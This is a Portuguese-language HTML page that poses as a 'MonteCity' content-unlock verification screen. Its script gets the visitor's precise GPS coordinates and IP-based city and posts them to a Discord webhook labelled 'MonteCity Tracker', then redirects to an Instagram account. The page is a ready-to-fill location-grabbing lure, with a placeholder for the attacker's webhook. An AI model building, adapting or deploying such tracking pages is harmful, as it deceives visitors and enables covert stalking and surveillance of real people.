<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MonteCity - Verificação</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000000;
            font-family: Arial, sans-serif;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .container {
            text-align: center;
            width: 90%;
            max-width: 400px;
        }
        img.locked-img {
            width: 100%;
            border-radius: 15px;
            margin-bottom: 20px;
            box-shadow: 0 0 15px rgba(211, 47, 47, 0.5);
        }
        h2 {
            font-size: 1.5rem;
            margin-bottom: 10px;
            color: #d32f2f;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        p {
            font-size: 0.9rem;
            margin-bottom: 25px;
            color: #cccccc;
        }
        .btn {
            background-color: #d32f2f;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1rem;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            animation: pulse 1.5s infinite;
            font-weight: bold;
            text-transform: uppercase;
        }
        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px #d32f2f;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(211, 47, 47, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(211, 47, 47, 0); }
            100% { box-shadow: 0 0 0 0 rgba(211, 47, 47, 0); }
        }
        .loading-text {
            display: none;
            margin-top: 20px;
            font-size: 0.9rem;
            color: #4caf50;
        }
        .error-msg {
            display: none;
            color: #ff5252;
            margin-top: 15px;
            font-size: 0.8rem;
        }
        /* Overlay da trava */
        .overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.6);
            z-index: 5;
            display: flex;
            justify-content: center;
            align-items: center;
            pointer-events: none;
        }
        .lock-icon {
            font-size: 3rem;
            color: #d32f2f;
            animation: spin 3s infinite linear;
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
    </style>
</head>
<body>

<div class="container">
    <!-- SUA IMAGEM AQUI -->
    <img src="https://noticiasmonte.github.io/montecity/imagens/img.png" alt="Imagem Principal" class="locked-img">
    
    <h2>Localização Pendente</h2>
    <p>Clique abaixo para permitir o rastreamento preciso e desbloquear o conteúdo.</p>
    
    <button class="btn" id="unlockBtn" onclick="iniciarVerificacao()">Desbloquear Agora</button>
    
    <div class="loading-text" id="loadingText">
        Aguardando GPS...<br>
        <small style="color: #888;">Certifique-se de ativar a localização no seu celular.</small>
    </div>
    
    <div class="error-msg" id="errorMsg"></div>
</div>

<!-- Overlay de trava girando -->
<div class="overlay" id="overlay" style="display: none;">
    <div class="lock-icon">🔒</div>
</div>

<script>
    // COLE SEU WEBHOOK DO DISCORD AQUI
    const WEBHOOK_URL = "SEU_LINK_DO_WEBHOOK_AQUI"; 

    function iniciarVerificacao() {
        const btn = document.getElementById('unlockBtn');
        const loading = document.getElementById('loadingText');
        const overlay = document.getElementById('overlay');
        const errorDiv = document.getElementById('errorMsg');
        
        btn.style.display = 'none';
        loading.style.display = 'block';
        overlay.style.display = 'flex';

        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    // Precisão em metros
                    const accuracy = position.coords.accuracy;
                    
                    // Pega dados do IP como backup
                    fetchIpData().then(ipData => {
                        enviarParaDiscord(lat, lng, accuracy, ipData);
                    });
                },
                (error) => {
                    let msg = "Erro ao pegar GPS: ";
                    switch(error.code) {
                        case error.PERMISSION_DENIED: msg += "Permissão negada."; break;
                        case error.POSITION_UNAVAILABLE: msg += "Localização indisponível."; break;
                        case error.TIMEOUT: msg += "Tempo esgotado. Tente novamente."; break;
                        default: msg += "Erro desconhecido.";
                    }
                    showError(msg);
                },
                {
                    enableHighAccuracy: true, // Força uso de GPS real
                    timeout: 15000,           // Espera até 15 segundos pelo sinal
                    maximumAge: 0             // Não usa cache antigo
                }
            );
        } else {
            showError("Seu navegador não suporta geolocalização.");
        }
    }

    async function fetchIpData() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            return await res.json();
        } catch (e) {
            return { city: "Indefinida", country_name: "Indefinido" };
        }
    }

    async function enviarParaDiscord(lat, lng, accuracy, ipInfo) {
        // Cria o link do Google Maps
        const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
        // Cria a URL da imagem do mapa estático
        const mapImgUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lng}&zoom=15&size=600x300&markers=color:red%7C${lat},${lng}&key=SUA_CHAVE_API_AQUI`; 
        
        // Se não tiver chave API, usamos o link direto
        const embedData = {
            title: "📍 Nova Localização Recebida!",
            description: `**Precisão:** ${accuracy} metros\n**IP:** ${ipInfo.ip || 'N/A'}\n**Cidade:** ${ipInfo.city || 'N/A'}`,
            url: mapLink,
            color: 13984623, // Cor vermelha
            fields: [
                { name: "Latitude", value: lat.toFixed(6), inline: true },
                { name: "Longitude", value: lng.toFixed(6), inline: true }
            ],
            footer: { text: "MonteCity Tracker" },
            timestamp: new Date().toISOString()
        };

        // Envia para o Discord
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embedData] })
        }).catch(err => console.error("Erro no webhook:", err));

        // Finaliza
        finalizarComSucesso();
    }

    function finalizarComSucesso() {
        document.querySelector('.container').innerHTML = `
            <img src="https://noticiasmonte.github.io/montecity/imagens/img.png" style="width:100%; border-radius:15px;">
            <h2 style="color:#4caf50;">Desbloqueado!</h2>
            <p>Redirecionando...</p>
        `;
        setTimeout(() => {
            window.location.href = "https://www.instagram.com/montecitybr";
        }, 2000);
    }

    function showError(msg) {
        document.getElementById('loadingText').style.display = 'none';
        document.getElementById('overlay').style.display = 'none';
        const errorDiv = document.getElementById('errorMsg');
        errorDiv.textContent = msg;
        errorDiv.style.display = 'block';
        document.getElementById('unlockBtn').style.display = 'inline-block';
    }
</script>

</body>
</html>
